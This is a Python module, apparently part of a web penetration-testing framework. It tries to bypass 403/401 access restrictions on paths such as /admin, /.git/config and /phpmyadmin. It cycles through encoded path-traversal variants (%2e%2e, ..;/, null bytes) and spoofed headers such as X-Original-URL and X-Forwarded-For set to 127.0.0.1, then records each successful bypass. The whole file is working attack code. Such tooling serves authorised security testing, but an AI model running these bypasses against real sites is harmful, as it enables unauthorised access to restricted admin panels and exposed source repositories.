"""403_bypass — bypass 403/401 via path tricks + headers"""
from core.http import HttpClient

PATHS = ["/admin","/wp-admin","/api/admin","/.git/config","/server-status","/phpmyadmin"]

PATH_TRICKS = [
    "{p}", "{p}/", "{p}//", "{p}/.", "{p}/..", "{p}/..;/", "{p}/%2e/",
    "{p}/%2e%2e/", "{p}/..%2f", "{p}/%252e%252e/", "{p}/;", "{p}/;/",
    "{p}%20", "{p}%09", "{p}%00", "{p}?", "{p}#", "{p}/*",
    "//{p}", "///{p}", "/./{p}", "/{p}/.", "/%2e/{p}", "/{p}%2f",
]

HEADERS = [
    {"X-Original-URL": "{p}"},
    {"X-Rewrite-URL": "{p}"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"Referer": "{p}"},
]

class Bypass403:
    def run(self, session, logger):
        base = session.target.rstrip("/")
        http = HttpClient(session, logger)
        findings = []

        for path in PATHS:
            r = http.get(base + path)
            if not r or r.status_code != 403:
                continue
            print(f"[403_bypass] {path} -> 403, trying bypasses")
            # path tricks
            for t in PATH_TRICKS:
                u = base + t.format(p=path)
                r2 = http.get(u)
                if r2 and r2.status_code == 200:
                    findings.append({"path":path,"trick":"path","value":t})
                    print(f"  [!] PATH BYPASS: {t}")
                    logger.finding("403_bypass","high",f"path {t}")
            # header tricks
            for h in HEADERS:
                hh = {k: v.format(p=path) for k,v in h.items()}
                r2 = http.get(base + path, headers=hh)
                if r2 and r2.status_code == 200:
                    findings.append({"path":path,"trick":"header","value":list(h.keys())[0]})
                    print(f"  [!] HEADER BYPASS: {list(h.keys())[0]}")
                    logger.finding("403_bypass","high",f"header {list(h.keys())[0]}")

        print(f"[403_bypass] {len(findings)} bypasses")
        return {"findings": findings}
